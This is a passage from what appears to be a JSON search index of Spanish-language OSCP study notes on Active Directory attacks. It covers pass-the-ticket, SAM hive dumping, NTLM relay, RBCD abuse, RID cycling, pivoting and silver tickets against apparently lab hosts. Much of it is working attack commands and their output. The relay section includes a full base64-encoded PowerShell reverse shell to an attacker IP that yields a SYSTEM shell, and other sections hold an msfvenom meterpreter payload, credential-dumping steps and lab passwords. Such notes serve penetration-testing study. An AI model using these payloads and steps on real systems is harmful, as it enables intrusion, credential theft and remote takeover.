ImRXNjbSm4u8P0Rigy4EvH+zWiFvrXYjPCZUzu0At5LjVK7s2YUmYZhUrpLzinZnhaXVPo1+xQ5YUVbLRtpaOpkUYFp6OGWijLB3yP59W6igJwkLeNWVYWg2+uEGNj3F8YCwJLM1MkEpXWRkX/bnhP2lmPMbFEcb4vn2nv7S6p/PBwnBbqtujFWT84i9VtlEyZZh7T2k0bMMbe4RNKIyVK2NO6gqT8leREYTuDWM93fQLv2ZOzMxkORrmKRZ/q6Wq+mgYMeEQnD4Ay3tVXJD7020ks/aDRsPPRbFCeovptOUWC6yt2OPS9YU4ys1LWLW4abPqlabXYNdt7dPmWU9GHPLNA8g7ZrBojHrZSYiQ0svyXujgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCADMjCsbUV8Hjm5IC2rhbj2EgAQ+J0wUBQU3jWviJ+Xm6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNTAxMDMwNTI4MDZaphEYDzIwMjUwMTAzMTUyODA2WqcRGA8yMDI1MDExMDA1MjgwNlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC /ptt\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.1.2\n\n\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n\nC:\\tools&gt;powershell\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\tools&gt; Enter-Pssession -ComputerName DC01\n[DC01]: PS C:\\Users\\john\\Documents&gt; whoami\ninlanefreight\\john\n</code></pre>"},{"location":"OSCP/passTheTicketLinux/","title":"Pass the ticket en LINUX","text":""},{"location":"OSCP/passTheTicketLinux/#conceptos-a-tener-en-cuenta","title":"Conceptos a tener en cuenta","text":""},{"location":"OSCP/passTheTicketLinux/#keytab","title":"Keytab","text":"<ul> <li> <p>Definici\u00f3n: Un keytab es un archivo que almacena pares de claves (principal y clave) para servicios o usuarios. Estos pares son utilizados por Kerberos para autenticaci\u00f3n sin necesidad de que un usuario introduzca manualmente su contrase\u00f1a.</p> </li> <li> <p>Uso: Se usa principalmente en servidores para servicios que necesitan autenticarse en un dominio AD. El archivo keytab permite que estos servicios inicien sesi\u00f3n en Kerberos sin intervenci\u00f3n humana.</p> </li> </ul>"},{"location":"OSCP/passTheTicketLinux/#ccache","title":"Ccache","text":"<ul> <li> <p>Definici\u00f3n: Ccache (credential cache) es un archivo utilizado por Kerberos para almacenar tickets de autenticaci\u00f3n temporalmente. Cuando un usuario se autentica, Kerberos guarda su Ticket Granting Ticket (TGT) en este archivo.</p> </li> <li> <p>Uso: Se utiliza para almacenar tickets que permiten acceder a servicios dentro del dominio AD sin necesidad de volver a autenticarse cada vez.</p> </li> </ul>"},{"location":"OSCP/passTheTicketLinux/#kerberos-en-linux","title":"Kerberos en Linux","text":"<ul> <li> <p>Autenticaci\u00f3n en Kerberos: Cuando un usuario o servicio quiere autenticarse con AD en un entorno Linux, se inicia una solicitud de autenticaci\u00f3n Kerberos. Si el usuario ha iniciado sesi\u00f3n, su TGT se almacena en el archivo ccache. Para los servicios que necesitan autenticarse autom\u00e1ticamente, se usa el archivo keytab.</p> </li> <li> <p>Acceso a servicios: Una vez autenticado, Kerberos proporciona tickets de servicio almacenados en el ccache. Estos tickets son presentados a servicios dentro del dominio para obtener acceso.</p> </li> <li> <p>Configuraci\u00f3n: Los archivos keytab se configuran utilizando herramientas como ktutil o mediante scripts proporcionados por administradores de AD. Los ccache se manejan autom\u00e1ticamente por kinit y otros comandos relacionados con Kerberos.</p> </li> </ul>"},{"location":"OSCP/passTheTicketLinux/#comandos-utiles","title":"Comandos utiles","text":"<ul> <li><code>realm list</code> Lista informaci\u00f3n del AD</li> <li><code>klist</code> Lista informaci\u00f3n de kerberos</li> </ul>"},{"location":"OSCP/passTheTicketLinux/#recomendado-utilizar-linikatz-para-extraer-toda-esta-info","title":"Recomendado utilizar linikatz para extraer toda esta info","text":""},{"location":"OSCP/passTheTicketLinux/#impersonando-un-usuario-con-keytab","title":"Impersonando un usuario con keytab","text":"<pre><code>david@inlanefreight.htb@linux01:~$ klist \n\nTicket cache: FILE:/tmp/krb5cc_647401107_r5qiuu\nDefault principal: david@INLANEFREIGHT.HTB\n\nValid starting     Expires            Service principal\n10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB\n        renew until 10/07/22 17:02:11\ndavid@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab\ndavid@inlanefreight.htb@linux01:~$ klist \nTicket cache: FILE:/tmp/krb5cc_647401107_r5qiuu\nDefault principal: carlos@INLANEFREIGHT.HTB\n\nValid starting     Expires            Service principal\n10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB\n        renew until 10/07/22 17:16:11\n</code></pre> <ul> <li>Ahora, nos metemos a la carpeta compartida de este nuevo usuario Carlos</li> </ul> <pre><code>david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls\n\n  .                                   D        0  Thu Oct  6 14:46:26 2022\n  ..                                  D        0  Thu Oct  6 14:46:26 2022\n  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022\n\n                7706623 blocks of size 4096. 4452852 blocks available\n</code></pre>"},{"location":"OSCP/passTheTicketLinux/#keytabextract-abusar","title":"KeyTabExtract abusar","text":"<ul> <li>Para extraer los secretos de un archivo keytab, utilizamos KeyTabExtract.</li> </ul> <p><code>python3 keytabexcract.py USER.keytab</code></p> <ul> <li>Ya con el NTLM podemos hacer todos los ataque conocidos</li> </ul>"},{"location":"OSCP/passTheTicketLinux/#importing-the-ccache-file-into-our-current-session","title":"Importing the ccache File into our Current Session","text":"<pre><code>cp /tmp/krb5cc_647401106_5Eidyq .\nexport KRB5CCNAME=/root/krb5cc_647401106_5Eidyq\nklist\nsmbclient //DC01/julio -k\n</code></pre>"},{"location":"OSCP/pivoting/","title":"Pivoting &amp; Port forwarding","text":""},{"location":"OSCP/pivoting/#work-in-progress","title":"WORK IN PROGRESS","text":"<ul> <li>SSH port forwarding + proxychains</li> <li>Reverse port forwarding SSH<ul> <li>Chisel Alternative</li> </ul> </li> <li> <p>Ligolo</p> </li> <li> <p>Ping sweep linux: <code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done</code></p> </li> <li>Ping sweep windows cmd: <code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"</code></li> <li>Ping sweep windows powershell: <code>1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}</code></li> </ul>"},{"location":"OSCP/postCompromiseAttacks/","title":"Windows Active Directory Pentesting","text":""},{"location":"OSCP/postCompromiseAttacks/#post-compromise-attacks","title":"Post compromise attacks","text":"<ul> <li>kali impacket - secrets dump<ul> <li><code>impacket-secretsdump DC.LOCAL/USER:'PASSWORD'@$IP</code></li> <li>running secretsdump as local:<ul> <li><code>impacket-secrestsdump -sam sam.save -security security.save -system system.save LOCAL</code></li> </ul> </li> </ul> </li> <li>Kerberoasting</li> <li>ASREPRoasting<ul> <li>m\u00e1s material</li> <li>Cuando comprometemos una cuenta, un ataque para empezar es este.</li> </ul> </li> <li>Token impersonation attack<ul> <li>psexec</li> <li>mimikatz</li> <li>pypykatz</li> <li>Golden Ticket Attack<ul> <li>Silver ticket Attack</li> <li>Extra sids Attack</li> </ul> </li> <li>AddKeyCredentialLink/Shadow Credentials Attack</li> <li>Backup Operator to Domain Admin</li> <li>DPAPI Attack</li> <li>Resource-Based Constrained Delegation</li> <li>GMSA abusing and s4u delegation attack</li> <li>RID cycling attack</li> <li>MSSQL Microsoft SQL Server attacks</li> </ul> </li> <li>LNK File Attacks: <code>nxc smb 172.16.139.0/24 -u 'pthorpe' -p creds.txt -M slinky -o SERVER=172.16.139.10 NAME=urgent</code></li> </ul>"},{"location":"OSCP/postCompromiseAttacks/#post-compromise-attack-strategy","title":"Post compromise attack strategy","text":"<ul> <li>1st<ul> <li>kerberoasting</li> <li>ASREPRoasting</li> <li>secretsdump</li> <li>pass the hash</li> </ul> </li> <li>2nd: big deep<ul> <li>enum bloodhound</li> <li>old vulns</li> </ul> </li> </ul>"},{"location":"OSCP/postCompromiseAttacks/#an-other-post-compromise-attack-strategy","title":"An other post compromise attack strategy","text":""},{"location":"OSCP/postCompromiseAttacks/#attacking-sam","title":"Attacking SAM","text":"<ul> <li>Security Account Manager</li> </ul>"},{"location":"OSCP/postCompromiseAttacks/#copying-sam-registry-hives","title":"Copying SAM Registry Hives","text":"<ul> <li>hklm\\sam</li> <li>hklm\\system</li> <li>hklm\\security</li> <li>We can create backups of these hives using the reg.exe utility.</li> </ul>"},{"location":"OSCP/postCompromiseAttacks/#using-regexe-save-to-copy-registry-hives","title":"Using reg.exe save to copy registry hives.","text":"<p>```  C:\\WINDOWS\\system32&gt; reg.exe save hklm\\sam C:\\sam.save</p> <p>The operation completed successfully.</p> <p>C:\\WINDOWS\\system32&gt; reg.exe save hklm\\system C:\\system.save</p> <p>The operation completed successfully.</p> <p>C:\\WINDOWS\\system32&gt; reg.exe save hklm\\security C:\\security.save</p> <p>The operation completed successfully. <pre><code>#### Creating a Share with impacket-smbserver\n`impacket-smbserver -smb2support shareName someDir`\n\n#### Moving hive copies to share\n</code></pre> C:&gt; move sam.save \\YOUR_KALI_IP\\CompData         1 file(s) moved.</p> <p>C:&gt; move security.save \\YOUR_KALI_IP\\CompData         1 file(s) moved.</p> <p>C:&gt; move system.save \\YOUR_KALI_IP\\CompData         1 file(s) moved. ```</p>"},{"location":"OSCP/privEsc/","title":"Privilege Escalation","text":""},{"location":"OSCP/privEsc/#linux","title":"Linux","text":""},{"location":"OSCP/privEsc/#windows","title":"Windows","text":""},{"location":"OSCP/pypykatz/","title":"Pypykatz Mimikatz implementation in pure Python","text":""},{"location":"OSCP/pypykatz/#lsass-dump","title":"LSASS DUMP","text":"<p><code>pypykatz lsa minidump /home/peter/Documents/lsass.dmp</code></p>"},{"location":"OSCP/relay/","title":"Net-NTLMv2 / SMB Relay Attacks","text":"<ul> <li>Este ataquee se basa en el uso de NTLMv2 para la autenticaci\u00f3n de SMB, que es un protocolo de red utilizado para compartir archivos e impresoras en redes Windows. El ataque implica capturar el hash NTLMv2 y luego usarlo para autenticar a un usuario en otro sistema, lo que permite al atacante acceder a recursos protegidos sin necesidad de conocer la contrase\u00f1a real del usuario.</li> <li>Sirve para cuando no somos capaces de crackear el hash NTLMv2, pero tenemos acceso a la red y podemos hacer un relay de la autenticaci\u00f3n a otro sistema.</li> </ul> <ul> <li>M\u00e1s info</li> <li>Fuente de Microsoft</li> </ul>"},{"location":"OSCP/relay/#ntlmv2-relay-con-impacket","title":"NTLMv2 Relay con Impacket","text":"<ul> <li>Utilizamos el script de impacket ntlmrelayx para realizar el ataque.</li> <li>Con la flag <code>--no-http-server</code> evitamos que el script levante un servidor HTTP, ya que no lo necesitamos.</li> <li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"</code><ul> <li><code>-smb2support</code> habilita el soporte para SMBv2, lo que puede ser necesario en algunas configuraciones de red.</li> </ul> </li> <li><code>-t</code> especifica el objetivo al que queremos enviar la autenticaci\u00f3n.</li> <li><code>-c</code> especifica el comando que queremos ejecutar en el objetivo.<ul> <li><code>powershell -enc JABjAGwAaQBlAG4AdA...</code> es el comando que queremos ejecutar en el objetivo. En este caso, estamos utilizando PowerShell para ejecutar un comando codificado en Base64, en este caso una reverse shell</li> </ul> </li> </ul>"},{"location":"OSCP/relay/#ejemplo","title":"Ejemplo","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo impacket-ntlmrelayx -smb2support --no-http-server -t 192.168.207.212 -c \"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\"\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client RPC loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client SMB loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Protocol Client DCSYNC loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client SMTP loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server on port 445\n[*] Setting up WCF Server on port 9389\n[*] Setting up RAW Server on port 6666\n[*] Multirelay disabled\n\n[*] Servers started, waiting for connections\n[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.207.211, attacking target smb://192.168.207.212\n[*] Authenticating against smb://192.168.207.212 as FILES01/FILES02ADMIN SUCCEED\n[*] All targets processed!\n[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] All targets processed!\n[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] All targets processed!\n[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] All targets processed!\n[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] Service RemoteRegistry is in stopped state\n[*] All targets processed!\n[*] SMBD-Thread-10 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] All targets processed!\n[*] SMBD-Thread-11 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] Starting service RemoteRegistry\n[*] All targets processed!\n[*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] All targets processed!\n[*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!\n[*] Executed specified command on host: 192.168.207.212\n[-] SMB SessionError: code: 0xc0000043 - STATUS_SHARING_VIOLATION - A file cannot be opened because the share access flags are incompatible.\n[*] Stopping service RemoteRegistry\n</code></pre> <pre><code>C:\\Windows\\system32&gt;dir \\\\192.168.45.210\\test\ndir \\\\192.168.45.210\\test\nThe network name cannot be found.\n</code></pre> <pre><code>\u2514\u2500$ sudo nc -lvnp 1234\n[sudo] password for kali: \nlistening on [any] 1234 ...\nconnect to [192.168.45.210] from (UNKNOWN) [192.168.207.212] 49756\n\nPS C:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>"},{"location":"OSCP/reporting/","title":"Reporting tools","text":"<ul> <li>SysReptor</li> </ul>"},{"location":"OSCP/resourceBasedConstrainedDelegation/","title":"Resource-Based Constrained Delegation (RBCD) ATTACK","text":""},{"location":"OSCP/resourceBasedConstrainedDelegation/#descripcion-de-la-vulnerabilidad","title":"Descripci\u00f3n de la Vulnerabilidad","text":"<p>Resource-Based Constrained Delegation (RBCD) es una caracter\u00edstica de Active Directory (AD) que permite a un recurso (como una cuenta de computadora) especificar qu\u00e9 cuentas pueden delegar autenticaci\u00f3n en su nombre. A diferencia de la delegaci\u00f3n restringida tradicional, donde el delegador (origen) define los servicios a los que puede delegar, en RBCD el recurso objetivo define qui\u00e9n puede delegar hacia \u00e9l mediante el atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</p>"},{"location":"OSCP/resourceBasedConstrainedDelegation/#por-que-es-una-vulnerabilidad","title":"\u00bfPor qu\u00e9 es una vulnerabilidad?","text":"<p>Si un atacante obtiene control sobre una cuenta con permisos para modificar el atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> de un recurso (como una cuenta de computadora del controlador de dominio), puede configurar RBCD para permitir que una cuenta controlada por el atacante (e.g., una cuenta de computadora creada por \u00e9l) delegue autenticaci\u00f3n hacia ese recurso. Esto permite al atacante impersonar a cualquier usuario (como <code>Administrator</code>) y obtener acceso al recurso objetivo, como el controlador de dominio.</p>"},{"location":"OSCP/resourceBasedConstrainedDelegation/#ejemplo-de-htb-support","title":"Ejemplo de HTB SUPPORT","text":"<p>En este caso, el usuario <code>support</code> ten\u00eda permisos <code>GenericAll</code> o <code>GenericWrite</code> sobre la cuenta de computadora del DC (<code>DC$</code>), lo que permiti\u00f3 modificar el atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> y abusar de RBCD para impersonar a <code>Administrator</code>.</p> <p>completo al Dominio: Al impersonar a <code>Administrator</code>, el atacante puede obtener una shell en el controlador de dominio y comprometer todo el dominio.</p>"},{"location":"OSCP/resourceBasedConstrainedDelegation/#identificacion-de-la-vulnerabilidad","title":"Identificaci\u00f3n de la Vulnerabilidad","text":"<p>Para identificar si RBCD puede ser explotado en un entorno Active Directory, necesitamos buscar cuentas que tengan permisos para modificar el atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> de otras cuentas (especialmente cuentas de computadoras privilegiadas, como la del controlador de dominio).</p>"},{"location":"OSCP/resourceBasedConstrainedDelegation/#identificacion-con-bloodhound","title":"Identificaci\u00f3n con bloodhound","text":""},{"location":"OSCP/resourceBasedConstrainedDelegation/#herramientas-necesarias","title":"Herramientas Necesarias","text":"<ul> <li>BloodHound: Para identificar relaciones y permisos en el dominio.</li> <li>ldapsearch o PowerView: Para enumerar permisos manualmente.</li> <li>Impacket: Para verificar permisos y explotar la vulnerabilidad.</li> <li>Rubeus: Para realizar ataques de Kerberos y obtener tickets TGT.</li> </ul>"},{"location":"OSCP/resourceBasedConstrainedDelegation/#pasos-de-explotacion","title":"Pasos de explotaci\u00f3n","text":"<ul> <li><code>addcomputer.py -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful -computer-name attackersystem -computer-pass Summer2018!</code><ul> <li>Utilizamos addcomputer.py para crear una computadora en el dominio con el usuario que identificamos como vulnerable.</li> </ul> </li> <li><code>addcomputer.py 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host RESOURCEDC.RESOURCED.LOCAL -domain-netbios resourced</code></li> <li><code>rbcd.py -dc-ip 10.10.11.174 -action write -delegate-to DC$ -delegate-from attackersystem$ support.htb/support:Ironside47pleasure40Watchful</code><ul> <li>Usamos rbcd.py para modificar el atributo msDS-AllowedToActOnBehalfOfOtherIdentity de DC$ y permitir que attackersystem$ delegue.</li> </ul> </li> <li><code>getST.py -dc-ip 10.10.11.174 -spn host/DC.SUPPORT.HTB -impersonate Administrator support.htb/attackersystem$:Summer2018!</code><ul> <li>Usamos getST.py para realizar el ataque S4U (S4U2self y S4U2proxy) y obtener un ticket de servicio (TGS) para host/DC.SUPPORT.HTB como Administrator</li> </ul> </li> <li>Exportamos el ticket <code>export KRB5CCNAME=$(pwd)/Administrator.ccache</code></li> <li>Nos conectamos como Administrator al DC: <code>wmiexec.py -k -no-pass support.htb/Administrator@DC.SUPPORT.HTB</code></li> </ul>"},{"location":"OSCP/reversePortForwardingSSH/","title":"Remote/Reverse Port Forwarding with SSH","text":"<ul> <li> <p>SSH puede escuchar en nuestro host local y reenviar un servicio en el host remoto a nuestro puerto, y el reenv\u00edo de puertos din\u00e1mico, donde podemos enviar paquetes a una red remota a trav\u00e9s de un host pivote. Pero a veces, puede que queramos reenviar un servicio local al puerto remoto tambi\u00e9n. Consideremos el escenario en el que podemos RDP en el host de Windows Windows A. Como se puede ver en la imagen de abajo, en nuestro caso anterior, podr\u00edamos pivotar en el host de Windows a trav\u00e9s del servidor Ubuntu. </p> </li> <li> <p>meterpreter (maquina atacante) &lt;=&gt; maquina pivot =&gt; windows A</p> </li> <li>Para entonces:  meterpreter &lt;=== windows A</li> <li>En nuestra maquina atacante: <code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></li> </ul> <p></p> <ul> <li>Entonces por ejemplo a la reverse shell de lhost le vamos a poner la IP del pivot:</li> <li><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></li> <li> <p>Luego al ya haber creado el tunnel reverso podemos abrir un python http server en nuestra maquina atacante <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/htb]\n\u2514\u2500$ python3 -m http.server 8080                                                \nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n127.0.0.1 - - [13/Jan/2025 12:38:14] \"GET /backupscript.exe HTTP/1.1\" 200 -\n</code></pre></p> </li> <li> <p>En la maquina windows hacemos una peticion HTTP get de la shell <pre><code>PS C:\\Windows\\system32&gt; Invoke-WebRequest -Uri \"http://172.16.5.129:8080/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"\n</code></pre></p> </li> <li>Como se puede apreciar, en el servidor http parece que \"localhost\" hizo la petici\u00f3n, y esto es justamente por el tunnel reverso.</li> <li>importante en el msfconsole, dentro del multihandler poner <code>set lhost 0.0.0.0</code> para que tome cualquier acceso al puerto especificado en el tunnel con ssh.</li> </ul>"},{"location":"OSCP/ridCyclingAttack/","title":"RID cycling attack","text":""},{"location":"OSCP/ridCyclingAttack/#definicion-ridsid","title":"Definici\u00f3n RID/SID","text":"<ul> <li>En un entorno Windows, cada cuenta (ya sea de usuario, grupo, etc.) tiene un identificador de seguridad \u00fanico (SID). Este SID est\u00e1 compuesto por una parte fija (que identifica al dominio) y una parte variable denominada Relative Identifier (RID). Los RIDs se asignan de forma incremental para cada cuenta nueva. Por ejemplo, el primer usuario creado en el dominio podr\u00eda tener un RID bajo, mientras que otros usuarios tendr\u00e1n RIDs mayores.</li> </ul>"},{"location":"OSCP/ridCyclingAttack/#el-ataque-en-si","title":"El ataque en s\u00ed","text":"<ul> <li> <p>Enumerar cuentas de usuario: Se recorre secuencialmente (o en un rango espec\u00edfico) los RIDs para interrogar al controlador de dominio y obtener el nombre de la cuenta asociada a cada uno.</p> </li> <li> <p>Identificar nombres de usuario o cultos o con privilegios altos: Muchas veces, se puede descubrir un usuario con privilegios especiales o una cuenta con configuraciones particulares que resulten \u00fatiles para la explotaci\u00f3n.</p> </li> </ul>"},{"location":"OSCP/ridCyclingAttack/#ejemplo-sin-credenciales","title":"Ejemplo sin credenciales","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/boxes/manager]\n\u2514\u2500$ lookupsid.py anonymous@manager.htb\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nPassword:\n[*] Brute forcing SIDs at manager.htb\n[*] StringBinding ncacn_np:manager.htb[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209\n498: MANAGER\\Enterprise Read-only Domain Controllers (SidTypeGroup)\n500: MANAGER\\Administrator (SidTypeUser)\n501: MANAGER\\Guest (SidTypeUser)\n502: MANAGER\\krbtgt (SidTypeUser)\n512: MANAGER\\Domain Admins (SidTypeGroup)\n513: MANAGER\\Domain Users (SidTypeGroup)\n514: MANAGER\\Domain Guests (SidTypeGroup)\n515: MANAGER\\Domain Computers (SidTypeGroup)\n516: MANAGER\\Domain Controllers (SidTypeGroup)\n517: MANAGER\\Cert Publishers (SidTypeAlias)\n518: MANAGER\\Schema Admins (SidTypeGroup)\n519: MANAGER\\Enterprise Admins (SidTypeGroup)\n520: MANAGER\\Group Policy Creator Owners (SidTypeGroup)\n521: MANAGER\\Read-only Domain Controllers (SidTypeGroup)\n522: MANAGER\\Cloneable Domain Controllers (SidTypeGroup)\n525: MANAGER\\Protected Users (SidTypeGroup)\n526: MANAGER\\Key Admins (SidTypeGroup)\n527: MANAGER\\Enterprise Key Admins (SidTypeGroup)\n553: MANAGER\\RAS and IAS Servers (SidTypeAlias)\n571: MANAGER\\Allowed RODC Password Replication Group (SidTypeAlias)\n572: MANAGER\\Denied RODC Password Replication Group (SidTypeAlias)\n1000: MANAGER\\DC01$ (SidTypeUser)\n1101: MANAGER\\DnsAdmins (SidTypeAlias)\n1102: MANAGER\\DnsUpdateProxy (SidTypeGroup)\n1103: MANAGER\\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)\n1113: MANAGER\\Zhong (SidTypeUser)\n1114: MANAGER\\Cheng (SidTypeUser)\n1115: MANAGER\\Ryan (SidTypeUser)\n1116: MANAGER\\Raven (SidTypeUser)\n1117: MANAGER\\JinWoo (SidTypeUser)\n1118: MANAGER\\ChinHae (SidTypeUser)\n1119: MANAGER\\Operator (SidTypeUser)\n</code></pre>"},{"location":"OSCP/shellMGT/","title":"Shell Management","text":"<ol> <li><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</code></li> <li>CTRL + Z</li> <li><code>stty raw -echo; fg</code></li> <li><code>export TERM=xterm-256color</code></li> <li><code>stty sane</code></li> <li><code>stty rows 40; stty cols 80</code></li> </ol>"},{"location":"OSCP/shellMGT/#alternativa","title":"alternativa","text":"<ul> <li><code>rlwrap nc -lvnp $port</code></li> </ul>"},{"location":"OSCP/silverTicketAttack/","title":"Ataque Silver Ticket","text":"<p>Un ataque de silver ticket consiste en forjar un ticket de servicio Kerberos para obtener acceso no autorizado a un servicio espec\u00edfico en un servidor. A diferencia de un golden ticket, que permite acceso a cualquier recurso del dominio, el silver ticket se enfoca en un servicio concreto (por ejemplo, MSSQL) y puede usarse para hacerse pasar por un administrador u otra cuenta privilegiada en ese servicio.</p>"},{"location":"OSCP/silverTicketAttack/#requisitos","title":"Requisitos","text":"<p>Para realizar un ataque de silver ticket, necesitas lo siguiente:</p> <ul> <li>Hash NTLM de la cuenta de servicio: El hash de la cuenta asociada al servicio objetivo (por ejemplo, la cuenta de servicio de MSSQL).</li> <li>SID del dominio: El identificador de seguridad (SID) del dominio de Active Directory.</li> <li>SID de la cuenta de servicio: El SID de la cuenta de servicio.</li> <li>Nombre del servicio: El nombre del servicio principal de Kerberos (SPN) del servicio objetivo (por ejemplo, MSSQLSvc).</li> <li>Nombre del dominio: El nombre de dominio completo (FQDN) de Active Directory.</li> <li>Nombre del servidor: El FQDN del servidor que aloja el servicio.</li> </ul>"},{"location":"OSCP/silverTicketAttack/#comandos-para-obtener-la-informacion-requerida-sin-permisos-de-administrador","title":"Comandos para Obtener la Informaci\u00f3n Requerida (Sin Permisos de Administrador)","text":"<ol> <li>Obtener el hash NTLM de la cuenta de servicio:</li> <li>Sin permisos de administrador, puedes intentar obtener el hash NTLM de la cuenta de servicio mediante t\u00e9cnicas como:<ul> <li>Kerberoasting: articulo ac\u00e1</li> <li>Si conocemos la contrase\u00f1a en texto plano podemos generar el hash NTLM: versi\u00f3n web <pre><code>echo -n \"&lt;CONTRASE\u00d1A&gt;\" | iconv -t UTF16LE | openssl dgst -md4\n</code></pre></li> </ul> </li> <li>Obtener el SID del dominio:</li> <li> <p>Usa <code>ldapsearch</code> o herramientas de 